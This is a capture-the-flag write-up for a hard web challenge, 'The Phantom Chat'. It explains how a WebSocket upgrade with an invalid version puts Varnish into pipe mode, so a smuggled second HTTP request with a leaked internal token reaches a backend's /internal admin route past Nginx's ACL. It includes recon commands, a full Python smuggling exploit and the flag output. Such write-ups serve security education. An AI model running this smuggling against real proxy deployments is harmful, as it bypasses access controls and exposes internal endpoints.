# The Phantom Chat

> **Category:** Web · **Event:** KubSTU CTF 2026 Autumn · **Difficulty:** Hard

## 📌 Task

"Phantom Messenger" is a corporate messenger with a multi-layer architecture: Varnish → Nginx → Backend. Nginx protects the internal routes (`deny all` on `/internal/*`), but a WebSocket upgrade on `/ws` puts Varnish into pipe mode and opens a raw TCP tunnel straight to the backend. The goal is to smuggle a second HTTP request through that tunnel, reaching `/internal/admin/flag` while bypassing Nginx.

**Files:** [recon-headers.txt](../../../assets/Web/Phantom%20Chat/recon-headers.txt) · [ws-426-response.txt](../../../assets/Web/Phantom%20Chat/ws-426-response.txt) · [exploit-output.txt](../../../assets/Web/Phantom%20Chat/exploit-output.txt)

## 🏁 Solution

### 1. Application overview

Opening `http://CHALLENGE_HOST:35802` we see the landing page of a corporate messenger, "Phantom Messenger":

![Landing Page](../../../assets/Web/Phantom%20Chat/01-landing.png)

The site looks like a full-fledged product — there is registration, authorization, a chat with channels, Pricing, Docs, About pages and so on.

### 2. Registration and login

We register and log in to the messenger:

![Register](../../../assets/Web/Phantom%20Chat/02-register.png)

![Login](../../../assets/Web/Phantom%20Chat/03-login.png)

After logging in we end up in a chat with channels #general, #engineering, #devops etc. An ordinary corporate messenger with no obvious hints.

### 3. Reconnaissance (Recon)

#### 3.1. HTTP headers

We start by analyzing the response headers:

```bash
$ curl -sI http://localhost:35802/
```

```
Server: nginx/1.25.5
Via: 1.1 fd54f2d70807 (Varnish/7.4)
X-Varnish: 29
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

**Key findings:**
- `Via: 1.1 ... (Varnish/7.4)` — there is a Varnish at the front
- `Server: nginx/1.25.5` — behind Varnish there is Nginx

This is a multi-layer architecture: **Varnish → Nginx → Backend**

#### 3.2. Finding endpoints

By brute force or via `/api/info` we find:

```bash
$ curl -s http://localhost:35802/api/info | python -m json.tool
```

```json
{
    "service": "phantom-messenger",
    "version": "2.1.0",
    "endpoints": {
        "channels": "/api/channels",
        "health": "/api/health",
        "info": "/api/info",
        "status": "/api/status"
    }
}
```

#### 3.3. Discovering the WebSocket endpoint

Through dirsearch/ffuf or analysis of the JS in the chat we find `/ws`:

```bash
$ curl -sI http://localhost:35802/ws \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 7"
```

```
HTTP/1.1 426 Upgrade Required
Server: Go-H2C
Sec-Websocket-Version: 13
X-Debug-Auth: UGhhbnRvbUJ5cGFzczIwMjY=
Content-Type: application/json
```

**Critical findings:**
1. `Server: Go-H2C` — the backend is written in Go (not nginx!)
2. **`X-Debug-Auth: UGhhbnRvbUJ5cGFzczIwMjY=`** — a leaked debug header!
3. The `426` response instead of `101` — the WebSocket version was rejected
4. The `Via` header is **absent** — the request went **directly** to the backend, bypassing Nginx!

#### 3.4. Decoding the token

```bash
$ echo "UGhhbnRvbUJ5cGFzczIwMjY=" | base64 -d
PhantomBypass2026
```

We got the token: `PhantomBypass2026`

### 4. Understanding the vulnerability

#### Architecture:
```
Client → Varnish:6081 → Nginx:80 → Backend:5000
              ↓ (if Upgrade + /ws)
              └──── pipe ────→ Backend:5000 (напрямую, минуя Nginx!)
```

#### Key observations:

1. On a request to `/ws` with the `Upgrade: websocket` header — Varnish switches to **pipe mode** (a raw TCP tunnel straight to the backend)
2. The backend responds with `426` (not `101`), but **Varnish is already in pipe mode** and does not inspect the response
3. The TCP connection stays open — you can send a **second HTTP request** over the same connection
4. This request will go straight to the backend, **bypassing Nginx** and its ACL

#### What Nginx blocks:
- `deny all` on `/internal/*`
- Stripping the `X-Internal-Token` header

#### What we bypass:
Through smuggling, the request goes **directly** to the backend — Nginx does not see it at all!

### 5. Exploitation

#### 5.1. WebSocket Smuggling (Python)

```python
import socket
import base64

host = "CHALLENGE_HOST"
port = 35802

# Шаг 1: WebSocket upgrade с невалидной версией
upgrade = (
    f"GET /ws HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    f"Sec-WebSocket-Version: 7\r\n"
    f"\r\n"
)

# Шаг 2: Smuggled запрос к internal endpoint
smuggled = (
    f"GET /internal/admin/flag HTTP/1.1\r\n"
    f"Host: localhost\r\n"
    f"X-Internal-Token: PhantomBypass2026\r\n"
    f"Connection: close\r\n"
    f"\r\n"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((host, port))

# Отправляем upgrade → Varnish входит в pipe mode
sock.sendall(upgrade.encode())

# Читаем 426 ответ (Varnish его пропускает, тоннель открыт)
response = b""
while b"\r\n\r\n" in response is False or len(response) < 10:
    chunk = sock.recv(4096)
    if not chunk: break
    response += chunk
    if b"\r\n\r\n" in response: break

print(response.decode())

# Отправляем smuggled запрос — идёт напрямую к бэкенду!
sock.sendall(smuggled.encode())

# Получаем флаг
flag_response = b""
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk: break
        flag_response += chunk
    except: break

print(flag_response.decode())
sock.close()
```

#### 5.2. Exploit output

```
============================================================
  The Phantom Upgrade - WebSocket Smuggling Exploit
============================================================

[*] Connecting to localhost:35802
[*] Sending WebSocket Upgrade with invalid version (Sec-WebSocket-Version: 7)
[*] Reading 426 response from backend (Varnish stays in pipe mode)...
[*] Got response: HTTP/1.1 426 Upgrade Required
[+] Found token hint in X-Debug-Auth: PhantomBypass2026
[*] Tunnel is open! Sending smuggled request to /internal/admin/flag
[*] Reading flag response...

[+] Smuggled response:
HTTP/1.1 200 OK
Content-Type: application/json
Server: Go-H2C

{"flag":"KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}",
 "message":"Congratulations! You've mastered WebSocket smuggling through the Phantom Upgrade."}

[!!!] FLAG: KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}
```

### 6. Short attack chain

```
1. Recon → обнаруживаем Varnish + Nginx по заголовкам
2. Находим /ws endpoint (dirsearch / JS analysis)
3. WebSocket handshake с Version:7 → 426 + X-Debug-Auth утечка
4. base64 decode → PhantomBypass2026
5. Понимаем: Varnish pipe mode → прямой тоннель к бэкенду
6. Smuggling: второй HTTP-запрос через открытый тоннель
7. GET /internal/admin/flag + X-Internal-Token → FLAG!
```

### 7. Flag

```
KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}
```

### Sources

- [WebSocket Smuggling](https://www.intruder.io/research/practical-http-header-smuggling)
- [Varnish pipe mode documentation](https://varnish-cache.org/docs/trunk/users-guide/vcl-built-in-subs.html)
- [RFC 6455 — The WebSocket Protocol](https://tools.ietf.org/html/rfc6455)

**Flag:** `KubSTU{v4rn1sh_p1p3_m0d3_w3bs0ck3t_smuggl1ng}`
